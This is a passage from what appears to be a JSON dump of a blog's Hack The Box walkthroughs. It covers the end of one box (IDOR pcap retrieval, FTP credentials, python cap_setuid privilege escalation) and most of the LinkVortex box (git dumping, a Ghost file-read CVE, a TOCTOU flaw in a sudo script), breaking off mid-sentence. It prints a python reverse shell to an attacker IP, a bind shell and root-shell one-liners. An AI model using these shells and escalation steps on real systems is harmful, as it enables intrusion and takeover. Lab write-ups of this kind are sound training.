RouterOS 7.X OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) Network Distance: 2 hops Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 34.10 seconds Findings: vsftp 3.0.3 is being used. The OS is ubuntu. The webserver seems to be running something called Gunicorn and it has a Security Dashboard. FTP 21: Let\u0026rsquo;s check out FTP first. We can enter anonymous for both the username and password to try and get an anonymous connection but this does not work. It\u0026rsquo;s not advisable to just start brute-forcing so let\u0026rsquo;s take a look at web and enumerate further.\nWeb 80: WhatWeb: Lets run \u0026ldquo;whatWeb\u0026rdquo; to see if I can glean some further information:\n#Command whatweb http://$box | sed \u0026#39;s/, /\\n/g\u0026#39; #Output http://10.129.255.182 [200 OK] Bootstrap Country[RESERVED][ZZ] HTML5 HTTPServer[gunicorn] IP[10.129.255.182] JQuery[2.2.4] Modernizr[2.8.3.min] Script Title[Security Dashboard] X-UA-Compatible[ie=edge] Results:\nWe can see that the actual HTTPServer is the gunicorn webserver (never heard of it myself so lets do some research) +Note+: I use sed to put the output across multiple lines for a nicer output.\nResearching Gunicorn Webserver: As this is the first time I have encountered this specific webserver, let\u0026rsquo;s take a look and see what we can find.\nLooking at the github for the project we can see it\u0026rsquo;s a Python WSGI HTTP Server \u0026amp; it is a fork of the Ruby project \u0026ldquo;Unicorn\u0026rdquo;. So we know the web application running is python based. If you want a primer on WSGI read the side-quest below.\nSide Quest: What is a WSGI (Web Server Gateway Interface)? This is a standard that was defined in PEP 3333 (originally introduced in PEP 333) as a means to create standardized interface to allow for Python web apps to be used in modern web development. WSGI is what allows Apache \u0026amp; NGINX etc to use python web applications as they utilize WSGI.\nIn simple terms: The interface acts as a bridge between python applications and webservers by handling the HTTP requests \u0026amp; responses. By using a WSGI it allows developers to focus on performance and scalability as there is a separation of the application logic and the webserver logic.\nThe WSGI (Web Server Gateway Interface) specification acts as a bridge between web servers and Python web applications. It lays out a standard way for the two to communicate, using two main components:\nWSGI server (server-side): This part receives incoming HTTP requests from the web server, then translates them into a format that Python applications can understand. It sets up environment variables with request details—like the URL, HTTP method, and headers—and passes a callback function to the application. WSGI application (application-side): This is your actual Python web app or framework. It takes the request, handles it based on the app\u0026rsquo;s routing logic, and returns a response that includes the HTTP status, response headers, and the body content. Dirbusting The Webserver Running Using FFUF: For completeness we should fuzz for other endpoints using FFUF.\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$box/FUZZ -ic Nothing additional found. Enumerating Injection Points With Burpsuite: Web Enumeration via Burp Suite: When manually enumerating a Website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Discovering A User is Logged Into the Web Interface By Default: Visiting the webserver we can see that the user Nathan is logged in by default and no credentials are required. Clicking on the \u0026ldquo;Settings\u0026rdquo; \u0026amp; \u0026ldquo;Message\u0026rdquo; button do not appear to do anything.\nEnumerating The Other Pages: Looking at the other pages on the left hand side we can see we have access to the below:\nIP Config Page:\n/ip: IP Config does as it sounds and gives us the output of the command ipconfig command. Network Status Page:\n/netstat: Network Status gives us the output of the netstat command. Capture Page:\n+Note+: This page would not work for me if loaded via burpsuite so I had to load via firefox.\n/data/[int] This to me seems to be the most interesting as from the description on the left it runs a packet capture for 5 seconds and then allows us to download the PCAP.\nWe can then download the PCAP and open it in Wireshark.\nIt is just our traffic to the server What is interesting though is that a simple integer is used in the url to reference the object. E.G. /data/1 this means that it could potentially be vulnerable to an IDOR attack.\nSide Quest: What is an IDOR Insecure Direct Object Reference Vulnerability? OWASP has a great explanation, but here\u0026rsquo;s a brief overview of what IDOR is and an example of how the attack works.\nWhat is IDOR?\nAn Insecure Direct Object Reference (IDOR) vulnerability occurs when an attacker can access or tamper with objects (like files, database records, or user accounts) by modifying the identifiers used by a web application.\nIDOR Example:\nImagine you\u0026rsquo;re using an online banking site, and when you view your account, the URL looks like this:\nhttp://bank.evilcorp.com/accounts/1000 Here, the number 1000 is likely a direct reference to your account ID in the backend database.\nIf you manually changed the URL to:\nhttp://bank.evilcorp.com/accounts/1001 and you\u0026rsquo;re able to view another user\u0026rsquo;s account without any additional checks—this would be an IDOR vulnerability. You\u0026rsquo;ve accessed another user\u0026rsquo;s data simply by modifying the object reference in the URL.\nRetrieving PCAP VIA Insecure Direct Object Reference (IDOR) Vulnerability: Let\u0026rsquo;s fuzz this with a number list.\nFirst we will need to create a simple sequential number list, luckily we can do this easily with bash using the printf function.\nprintf \u0026#39;%s\\n\u0026#39; {0..1000..1} \u0026gt; numbers.txt Now we can fuzz using ffuf:\nffuf -w numbers.txt -u http://$box/data/FUZZ -ic -fs 208 +Note+: To get the -fs value you need to let it run a second \u0026amp; then filter out that size.\nWe get the following output and as we can see they are all the same size apart from the entries 5 \u0026amp; 0. Examining 5.pcap: Checking the page /data/5 there are significantly more packets (146) in this capture that the previous one (3), however once opened it just details our traffic.\nExamining 0.pcap \u0026amp; finding FTP Credentials: This pcap has 72 packets in total and when opened we can see it contains internal traffic on the subnet 192.168.196.0/24, most likely from when the person was testing this. What immediately jumps out is that we have FTP traffic present this is important as FTP is clear text so we should be able to retrieve credentials. Scrolling over to the right we can see the credentials in clear text in the info column. Lets test the creds nathan:Buck3tH4TF0RM3! on the FTP service.\n2. Foothold: Logging Into FTP As Nathan: ftp $box The credentials work!\nChecking the contents of the server shows one file user.txt Let\u0026rsquo;s download it Checking it, it just contains our user flag. Logging Into SSH As Nathan: Checking for credential use we find that the found creds also work for SSH.\nssh nathan@$box Using Linpeas For Privesc Enumeration: We can copy linpeas.sh over easily using a python server.\n#Let\u0026#39;s grab the script first. wget https://github.com/peass-ng/PEASS-ng/releases/download/20250518-5781f7e5/linpeas.sh # Start our server python3 -m http.server 9000 #Then on the target wget http://[yourAttackBox]:9000/linpeas.sh chmod +x linpeas.sh ./linpeas.sh There are a couple of interesting finds. We first see that it says the host is vulnerable to CVE-2021-2255 however lets circle back round to this, mainly as it\u0026rsquo;s kernel exploit and I would prefer not to use a kernel exploit straight away as they can cause instability, so lets look at other privilege escalation vectors.\nWe can see that the python3.8 binary has the setuid, net_bind \u0026amp; eip capabilities set, now this is interesting! 3. Privilege Escalation: Side Quest: What are Linux Capabilities and How Can They Lead to Privilege Escalation? What are Linux Capabilities? Linux Capabilities allow finer-grained control over what privileges a process can have, breaking up the all-or-nothing nature of traditional Unix root access.\nInstead of giving full root privileges, specific capabilities (like binding to privileged ports or overriding file permissions) can be assigned to binaries or processes.\nWhile this enhances security by applying the principle of least privilege, it can also open doors for privilege escalation if:\nCapabilities are granted to insecure or user-controllable binaries. Sandboxing is inadequate. Attackers can exploit the functionality granted by capabilities. Key Capabilities and Descriptions: Capabilities with Root Escalation Potential (+non-exhaustive list — all capabilities should be investigated if found!+)\ncap_setuid : Allows a process to change its effective user ID — can escalate to root. cap_setgid : Allows changing group ID — similar implications as cap_setuid. cap_sys_admin : One of the most powerful capabilities — essentially root-equivalent in many contexts. cap_dac_override : Bypasses file permission checks — allows reading/executing normally inaccessible files. cap_net_bind_service : Bind to privileged ports (\u0026lt;1024). Combined with certain applications (e.g. vim or ncat), this can enable reverse shells. cap_sys_chroot : Allows changing the root directory. Could enable executing scripts in a manipulated chroot environment, bypassing normal execution flow or sandboxing. Enumerating Linux Capabilities: To identify binaries with Linux capabilities set, we can use the getcap utility:\nfind /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \\; This will output paths and their associated capabilities, for example:\nAdditional Reading https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work https://blog.ploetzli.ch/2014/understanding-linux-capabilities/ Using cap_setuid To Get A root Shell: As we can see the python3.8 binary has the cap_setuid \u0026amp; the cap_net_bind_service capabilities set. We are going to focus on the cap_setuid capability as this allows us to set the user ID in which the process runs. In English that means we can run the process as root.\nOption 1: Launching A Root Shell On The Host: To do this is very simple all we have to run is the following:\n/usr/bin/python3.8 -c \u0026#39;import os; os.setuid(0); os.system(\u0026#34;/bin/bash\u0026#34;);\u0026#39; Let\u0026rsquo;s break this down so it\u0026rsquo;s easier for everyone to understand.\n/usr/bin/python3.8 -c: call the python binary and use the -c command flag so we can then pass in our python command. import os: We import the os module as this will allow us to run os commands on the base operating system. os.setuid(0): We set the user id to 0 (root) so anything that comes after this command will be run in the context of the root user. os.system(\u0026quot;/bin/bash\u0026quot;): Now we spawn a bash shell and because we are in the context of the root user it will be a root shell. And boom we have our root shell. Let\u0026rsquo;s get our flag. Option 2: Launching A Reverse Root Shell: We can also get a reverse root shell using the same method by setting our uid to the context of the root user and then initiating our reverse shell.\n/usr/bin/python3.8 -c \u0026#39;import os,pty,socket;os.setuid(0);s=socket.socket();s.connect((\u0026#34;10.10.14.34\u0026#34;,443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; As you can see from the below example the shell on the right hand side is a root shell as we have passed the os.setuid(0) parameter, whereas if this is not entered (shell on left) we just get a reverse shell in the context of the original user who we launched the process, Nathan. Extra Credit: Creating A Bind Shell On A Privileged Port: This isn\u0026rsquo;t meant for privilege escalation, but I wanted to demonstrate what the cap_net_bind_service capability allows us to do. By running a bind shell that listens on port 443 (a privileged port). We can see that it\u0026rsquo;s possible on this machine because the binary has the cap_net_bind_service capability, which permits binding to ports below 1024 without root privileges.\n/usr/python3.8 -c \u0026#39;exec(\u0026#34;\u0026#34;\u0026#34;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\u0026#34;0.0.0.0\u0026#34;,443));s1.listen(1);c,a=s1.accept(); while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\u0026#34;\u0026#34;\u0026#34;)\u0026#39; Lessons Learned: What did I learn? This was just a nice enumeration box. I haven\u0026rsquo;t done an IDOR vulnerability in sometime so it was nice to do again. This also helped me brush up on linux capabilities which I have not done in a while too. What silly mistakes did I make? I nearly wrote off the capture page as it did not work in burpsuite\u0026rsquo;s browser, however luckily I re-tested in firefox. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\n",

    "http:\/\/localhost:1313\/walkthroughs\/linkvortex-box\/": {
        "title": "LinkVortex HTB Walkthrough: Ghost CMS, Git Dumping, and TOCTOU Exploitation",
        "tags": ["Box","HTB","Easy","Linux","Ghost","Subdomain","git-dumper","CVE-2024-40028","TOCTOU","Git","Race Condition","Privilege Escalation",],
        "content": "LinkVortex Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/LinkVortex How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan:\n#Command nmap $box -Pn -oA TCPbasicScan #Results ┌─(~/Dropbox/44-Blog/bloodstiller/content-org/Walkthroughs/HTB/Boxes/BlogEntriesMade/LinkVortex/scans)─────────(kali@kali:pts/8)─┐ └─(20:16:17 on main)──\u0026gt; nmap $box -Pn -oA TCPbasicScan ──(Tue,May13)─┘ Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 20:16 BST Nmap scan report for 10.129.231.194 Host is up (0.025s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds Initial thoughts: Pretty simple we have SSH \u0026amp; Web. Let\u0026rsquo;s skip SSH enumeration and investigate the web site as SSH as an attack vector is possible but unlikely and slow to brute-force, plus we don\u0026rsquo;t want to just start hammering a service straight away without enumerating properly. Comprehensive Scans: In depth scan TCP:\n#Command sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP #Results ┌─(~/Dropbox/44-Blog/bloodstiller/content-org/Walkthroughs/HTB/Boxes/BlogEntriesMade/LinkVortex/scans)─────────(kali@kali:pts/8)─┐ └─(20:16:21 on main)──\u0026gt; sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP ──(Tue,May13)─┘ [sudo] password for kali: Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 20:16 BST Nmap scan report for 10.129.231.194 Host is up (0.032s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA) |_ 256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519) 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: Did not follow redirect to http://linkvortex.htb/ Device type: general purpose Running: Linux 5.X OS CPE: cpe:/o:linux:linux_kernel:5.0 OS details: Linux 5.0, Linux 5.0 - 5.14 Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 36.72 seconds Findings: We can see the following: The host is most likely running ubuntu. The kernel is 5.0-5.14 The webserver is apache and that the site is called linkvortex.htb so lets add this to our /etc/hosts domain=\u0026#34;linkvortex.htb\u0026#34; box=10.129.231.194 sudo echo \u0026#34;$box $domain\u0026#34; | sudo tee -a /etc/hosts Web 80: Lets examine the website and webserver.\nWhatWeb: Lets run \u0026ldquo;whatWeb\u0026rdquo; to see if I can glean some further information:\n#Command whatweb http://$box | sed \u0026#39;s/, /\\n/g\u0026#39; #Output http://10.129.231.194 [301 Moved Permanently] Apache Country[RESERVED][ZZ] HTTPServer[Apache] IP[10.129.231.194] RedirectLocation[http://linkvortex.htb/] Title[301 Moved Permanently] http://linkvortex.htb/ [200 OK] Apache Country[RESERVED][ZZ] HTML5 HTTPServer[Apache] IP[10.129.231.194] JQuery[3.5.1] MetaGenerator[Ghost 5.58] Open-Graph-Protocol[website] PoweredBy[Ghost,a] Script[application/ld+json] Title[BitByBit Hardware] X-Powered-By[Express] X-UA-Compatible[IE=edge] Results: We can see there is a 301 redirect, The Ghost blog engine is being used \u0026amp; it\u0026rsquo;s version 5.58 The title is BitByBit Hardware JQuery 3.5.1 is being used. +Note+: I sed to put the output across multiple lines for a nicer output. Dirbusting The Web-Server Running Using ferox: We can perform some directory busting to see if there are any interesting directories:\n#Command feroxbuster -u http://$box:80 --threads 20 --scan-limit 2 -q -r -o $domain-FeroxScan.txt #Result There were not a huge amount of useful results so I am ommitting for brevity. Some notes on my flags: --threads 20 --scan-limit 2 I limit the threads \u0026amp; scan limit as otherwise it effectively DDOS\u0026rsquo; the site. -q As I run tmux for most sessions, this quiet flag removes the progress bar and is advised when using tmux etc. -r Follows redirects. -o $domain-FeroxScan.txt sometimes there can be ALOT of output so this makes it more manageable to go through later. Sub-domain Enumeration with FFUF: Let\u0026rsquo;s enumerate any possible subdomains.\nffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://$domain -H \u0026#34;Host:FUZZ.$domain\u0026#34; -fs 230 As we can see below we only got one hit back dev, however let\u0026rsquo;s check it out.\nLets add this to our /etc/hosts and then open up burpsuite and take a look at the dev subdomain.\nEnumerating The Site Using BurpSuite: Before we enumerate the dev.linkvortex.htb let\u0026rsquo;s enumerate the base site.\nWeb Enumeration via Burp Suite: When manually enumerating a Website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. A quick search of the site we can see it\u0026rsquo;s a blog with various posts about hardware\nEach Article Is Posted By Admin: Looking at the articles we can see they are all posted under the admin account.\n+Note+: This may not seem like much of a finding, but knowing the admin user is regularly used to login and make posts gives us at least one usable user we can test credentials for when (if) the time arises.\nFinding The Sign-in Page: With ghost the login page follows the convention of [url]/ghost/#/signin.\nhttp://linkvortex.htb/ghost/#/signin I try some basic creds e.g admin:admin but no dice, let\u0026rsquo;s keep enumerating.\nInvestigating dev.linkvortex.htb Looking at the dev subdomain it has a rudimentary page with the following message\nDiscovering Source Code Via Dirbusting: Through dir-busting we are able to find an exposed git repository.\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://dev.$domain/FUZZ -fs 230 -ic Checking the page we do have access to it:\nLooking at the file HEAD file in the /.git/logs directory we can see that the email address that cloned the repo is dev@linkvortex.htb.\n+Note+: This is also good as we now know the standard email structure. E.G. dev@linkvortex or admin@linkvortex etc.\nDownloading The Git repo using git-dumper(s): Now instead of downloading all of these files manually we can use gitdumper to dump the entire repo and inspect it locally.\ngit clone https://github.com/internetwache/GitTools cd GitTools/Dumper ./gitdumper.sh http://dev.$domain/.git/ /tmp/linkvortexgit/ We can see that git dumper isn\u0026rsquo;t actually downloading all the files and we may need them all so let\u0026rsquo;s grab them all.\n+Note+: So after lots of messing around I discovered there is also another application called git-dumper and this actually allows us to download the repo and use it.\nTo install git-dumper we can use pip or pipx.\npipx install git-dumper Now we can dump the repository locally and access it.\ngit-dumper http://dev.$domain/.git recoveredRepo Side Quest: What is Git \u0026amp; Why Can It Lead to Information Disclosure? Since I use Git daily (it\u0026rsquo;s how I manage this blog, among other projects) I tend to take this knowledge for granted. So let\u0026rsquo;s break it down: what Git is, how it works, and why in some cases it can unintentionally lead to information disclosure.\nGit is a version control tool that helps developers track changes made to code. It enables multiple people to work on the same codebase simultaneously and \u0026ldquo;commit\u0026rdquo; their changes. This means it maintains a full history of all modifications, which is crucial for collaboration, debugging, and accountability.\n+Note+: There are other version control systems like CVS, SVN, and Mercurial — but Git is by far the most widely used today.\nGit is primarily a command-line utility (you\u0026rsquo;ll often see commands like git [command]), though there are plenty of GUI front-ends and built-in version control tools in IDEs like VSCode or IntelliJ.\nIf you want to get a feel for git and a better understanding I would recommend following this good getting started guide: https://www.freecodecamp.org/news/a-beginners-guide-to-git-how-to-create-your-first-github-project-c3ff53f56861/ Information Disclosure in git: Because Git is so embedded in developer workflows, it\u0026rsquo;s not uncommon for people to accidentally commit (upload) sensitive information: like API keys, passwords, tokens, or private configuration files into a repository.\nEven if this sensitive data is later removed, Git keeps a history of every change, including the ones where that data was first added. Unless someone explicitly scrubs the Git history (using tools like git filter-branch or BFG Repo-Cleaner), that sensitive data will still be accessible in the logs and history.\nThis behavior is by design, Git is meant to preserve history to ensure transparency and accountability. But that same feature can become a vulnerability if not properly managed.\nHandy Git Terms for Beginners: As we will be using alot git terminology moving forward, I thought it would be beneficial to add these terms here for readers who are not familiar with git.\nRepository (repo): A project folder tracked by Git. It contains your code, configuration files, and a full history of changes. Can be local (on your machine) or remote (hosted on services like GitHub or GitLab).\nCommit A snapshot of your project at a specific point in time. Each commit includes a message describing the changes, and acts like a save point in the project\u0026rsquo;s history.\nClone Creating a local copy of a remote repository. Useful when you want to contribute to or inspect someone else\u0026rsquo;s project.\nPush Sending your local commits to a remote repository (e.g., on GitHub). You\u0026rsquo;re \u0026ldquo;pushing\u0026rdquo; your changes for others to see or collaborate on.\nPull Fetching and merging changes from a remote repository into your local one. Helps you stay up to date with what others are working on.\nBranch A parallel version of the project. Useful for experimenting, adding features, or fixing bugs without affecting the main codebase (usually called `main` or `master`).\nMerge Combining changes from one branch into another (usually from a feature branch into `main`). Git tries to automatically resolve differences between branches.\nStaging Area (Index) A middle step between making changes and committing them. You \u0026ldquo;stage\u0026rdquo; files you want to include in your next commit using `git add`.\n.git directory A hidden folder in every Git repo that contains all the history, config, and metadata. Never delete or expose this folder accidentally — it contains the soul of your project.\nHEAD A pointer to your current position in the Git history — usually the latest commit on your current branch.\nEnumerating the Git Repo For Secrets: Moving forward we will need to have git installed, if you do not you need to use your package manager to install it.\n# Debian based distros sudo apt update \u0026amp;\u0026amp; sudo apt install git Checking Git Logs: The primary thing we want to check first is the logs as this will display a list of all the commits to the project as well as the commit message made by the person who committed it.\nFrom inside the repository we can use git\ngit log As we can see these logs pertain to the actual Ghost repo and not the logs of the version that the linkvortex admin\u0026rsquo;s were using.\nChecking Git Status: We can check the Git status, this lets us know if there are any un-staged commits or changes that have been made that need to be committed.\ngit status As we can see here there are two files that are currently un-staged.\nauthentication.test.js file under ghost/core/test/regression/api/admin/ has been modified. Dockerfile.ghost has been created in the root of the repo. Discovering A Password Via Git diff: We can view the differences between the original files and the modified files by using the git diff command. This will show changes in the working directory that haven\u0026rsquo;t been staged yet.\nIf we add the --cached flag Git will show the differences between the staged (indexed) files and last commit. (This is useful if we want to see what will be included in the next commit).\ngit diff --cached As we can see the const password value in the file authentication.test.js was modified from the default value of thisissupersafe to OctopiFociPilfer45\n2. Foothold: Logging into Ghost As Admin: Now we have the password lets see if we can signin using it.\nhttp://linkvortex.htb/ghost/#/signin If we try dev@linkvortex.htb it will not work. However if we try admin@linkvortex.htb with the found password we can get access!\nDiscovering the Host Is Vulnerable to CVE-2023-40028: As we saw from the whatweb output earlier the host is running ghost 5.58, after some quick searching we can see that this specific version of ghost is susceptible to an arbitrary file read vulnerability.\nLooking online there is a public POC for this: https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028 Let\u0026rsquo;s grab the exploit.\ngit clone https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028.git To make life easier lets store the creds \u0026amp; domain in variables.\nuser=\u0026#39;admin@linkvortex.htb\u0026#39; pass=\u0026#39;OctopiFociPilfer45\u0026#39; domain=\u0026#39;linkvortex.htb\u0026#39; Running the exploit is simple, we enter the creds \u0026amp; host as argument\n./CVE-2023-40028 -u $user -p $pass -h http://$domain We then are prompted to enter the file we want to read. We will opt to use /etc/passwd as this is a world readable file so if the host is vulnerable this should work.\nIt worked, so we now know the host is vulnerable.\nWe can see there are two valid users, who have login shells \u0026ldquo;node\u0026rdquo; \u0026amp; \u0026ldquo;root\u0026rdquo; we can also see the standard \u0026ldquo;www-data\u0026rdquo; user is present for the web-server. +Note+: This is for the most part irrelevant, as it\u0026rsquo;s being run in docker, however it\u0026rsquo;s always good to check.\nI check the .bashrc but there is nothing of note\nWe can however enumerate the docker container operating system further by querying /etc/os-release\nWe can see it\u0026rsquo;s running Debian 11 (bullseye)\nOther files I checked for which were not present. In most cases these will not contain valuable information in a container, however it is always good to check for completeness.\n.bash_history /home/node/.ssh/id_rsa /home/node/.ssh/authorized_keys /root.ssh/id_rsa /root/.ssh/authorized_keys /etc/shadow (no access) /etc/httpd/conf/httpd.conf /etc/apache2/apache2.conf /var/log/httpd /var/log/cron /etc/environment /etc/profile Reading Ghosts Configuration File To Get Clear Text Creds: If we re-check the docker file that was present in the repo we can see the following entry, which is copying the file config.production.json to the directory /var/lib/ghost/.\nChecking this file in using the POC we get back clear text creds for the user bob@linkvortex.htb\nAs there are only two services running let\u0026rsquo;s see if we can access SSH now as bob.\nAccessing the Host As Bob VIA SSH: ssh bob@$box We are in!\nLet\u0026rsquo;s get our user flag\n3. Privilege Escalation: Discovering We Can Access A Script With SUDO Privileges: One of the first checks we should perform when gaining access to a system to see if the user we currently control can run any commands with sudo privileges. This is low hanging fruit but can lead to privesc.\nsudo -l Looking at the output we can see the that bob can run the script /opt/ghost/clean_symlink.sh as sudo however it looks like that it can only be run if a .png file is also passed.\nLooking at the folder where the file is enclosed we can see most objects are owned by the root user. - We can also see that the config.production.json \u0026amp; clean_symlink.sh are readable to us. However all other files are not.\nLet\u0026rsquo;s check out the script and see if there are any vulnerabilites wihtin it.\nBreaking Down clean_symlink.sh: Let\u0026rsquo;s break the down bit by bit so we can get an understanding of what is going on.\nSetting Variables \u0026amp; Boolean Values: #!/bin/bash QUAR_DIR=\u0026#34;/var/quarantined\u0026#34; if [ -z $CHECK_CONTENT ];then CHECK_CONTENT=false fi QUAR_DIR=\u0026quot;/var/quarantined\u0026quot; Is a variable setting the value of QUAR_DIR to the directory /var/quarantined\nWe then have an if statement that checks if the value of the variable $CHECK_CONTENT is equal to zero. It does this by using the inbuilt bash function of -z, which will return TRUE if the value of the string is zero. Then if is zero it will set the value of the variable CHECK_CONTENT to FALSE. As there is nothing else setting the value of CHECK_CONTENT this will therefore always return false.\nLINK=$1 if ! [[ \u0026#34;$LINK\u0026#34; =~ \\.png$ ]]; then /usr/bin/echo \u0026#34;! First argument must be a png file !\u0026#34; exit 2 fi It then sets the value of the LINK variable to $1, which is the first command line argument passed to the script.\nIf the command line argument passed is not equal to a file ending .png it will echo out the message \u0026ldquo;! First argument must be a png file !\u0026rdquo; and exit the program.\nMain Logic: This next part is the main logic of the script which contains a nested if statements. Here is the complete logic, however we will break each statement down into manageable chunks also so it\u0026rsquo;s easier to understand the logic.\nif /usr/bin/sudo /usr/bin/test -L $LINK;then LINK_NAME=$(/usr/bin/basename $LINK) LINK_TARGET=$(/usr/bin/readlink $LINK) if /usr/bin/echo \u0026#34;$LINK_TARGET\u0026#34; | /usr/bin/grep -Eq \u0026#39;(etc|root)\u0026#39;;then /usr/bin/echo \u0026#34;! Trying to read critical files, removing link [ $LINK ] !\u0026#34; /usr/bin/unlink $LINK else /usr/bin/echo \u0026#34;Link found [ $LINK ] , moving it to quarantine\u0026#34; /usr/bin/mv $LINK $QUAR_DIR/ if $CHECK_CONTENT;then /usr/bin/echo \u0026#34;Content:\u0026#34; /usr/bin/cat $QUAR_DIR/$LINK_NAME 2\u0026gt;/dev/null fi fi fi First part.\nif /usr/bin/sudo /usr/bin/test -L $LINK;then LINK_NAME=$(/usr/bin/basename $LINK) LINK_TARGET=$(/usr/bin/readlink $LINK) It then uses sudo to run the test binary. The test binary is used to check file types and compare the values of them. The -L flag is used to test if the $LINK variable is a symbolic link, so this line is testing if the variable $LINK is a symbolic link.\nWe can see that then the LINK_NAME target variable is set to run the basename binary and pass it the LINK variable. The basename binary is used for stripping the directory \u0026amp; suffix from filenames. Below is an example showing this.\nif /usr/bin/echo \u0026#34;$LINK_TARGET\u0026#34; | /usr/bin/grep -Eq \u0026#39;(etc|root)\u0026#39;;then /usr/bin/echo \u0026#34;! Trying to read critical files, removing link [ $LINK ] !\u0026#34; /usr/bin/unlink $LINK else This is an attempt at security mitigation, as it then uses the echo binary to read output the value of the LINK_TARGET variable and pipes | it into the grep binary. Where the -E (extended) flag is used to allow the use of regex patterns, which we can see are being used as '(etc|root)' is regex syntax. The q flag is also used, to suppress any output being written to stdout.\nIf the strings etc or root are found in the LINK_TARGET value it will display the message ! Trying to read critical files, removing link [ $LINK ] !\u0026quot; and then use the unlink binary to remove the symbolic link.\n/usr/bin/echo \u0026#34;Link found [ $LINK ] , moving it to quarantine\u0026#34; /usr/bin/mv $LINK $QUAR_DIR/ if $CHECK_CONTENT;then /usr/bin/echo \u0026#34;Content:\u0026#34; /usr/bin/cat $QUAR_DIR/$LINK_NAME 2\u0026gt;/dev/null If however the strings etc or root are not found it will display the message \u0026quot;Link found [ $LINK ] , moving it to quarantine\u0026quot; it will then use the mv binary to move the LINK value to the quarantine directory which we saw earlier is set to /var/quarantined.\nIt will then check if the CHECK_CONTENT value is set to TRUE and if so it will use the echo \u0026amp; cat binary to display the content of the LINK_NAME variable value. Effectivly displaying the contents of the linked file.\n+Note+: This will always resolve to FALSE as the only other place this value is set is in the first part of the script where it is set to FALSE So What Does It Actually Do? It takes a single argument of a .png file.\nIf the file is a symlink and the symlink references either a path that contains passwd or etc it will move the file to /var/quarantined \u0026amp; remove the symbolic link.\nTo see it in action see the below test we can do demonstrating this. We can make a symlink that references /etc/passwd and call it cat.png it will remove the file. If the file is a symbolic link but does not reference either etc or passwd \u0026amp; CHECK_CONTENT is == to TRUE it will print the content of the file to the screen. However, as stated previously this logic will never trigger as CHECK_CONTENT is set to FALSE by default.\nSo what does this mean for us? This means if we can set the CHECK_CONTENT value to TRUE and pass it symbolic link we can have it read a file for us, however we can do a little more as the way the script is structured allows us to take advantage of a race condition.\nWhy The Script Is Vulnerable to a (TOCTOU) Time-Of-Check To Time-Of-Use Race Condition The script is vulnerable because it checks the symlink target before moving the link to the quarantine folder, but then reads the symlink contents after moving it. This time gap opens a window for exploitation.\n# The Check if /usr/bin/echo \u0026#34;$LINK_TARGET\u0026#34; | /usr/bin/grep -Eq \u0026#39;(etc|root)\u0026#39;; then # The Move /usr/bin/mv $LINK $QUAR_DIR/ The use (reading the contents of the symlink) happens after the move.\n# Reading the contents if $CHECK_CONTENT; then /usr/bin/echo \u0026#34;Content:\u0026#34; /usr/bin/cat $QUAR_DIR/$LINK_NAME 2\u0026gt;/dev/null Between these two actions — the check and the use/read — an attacker can 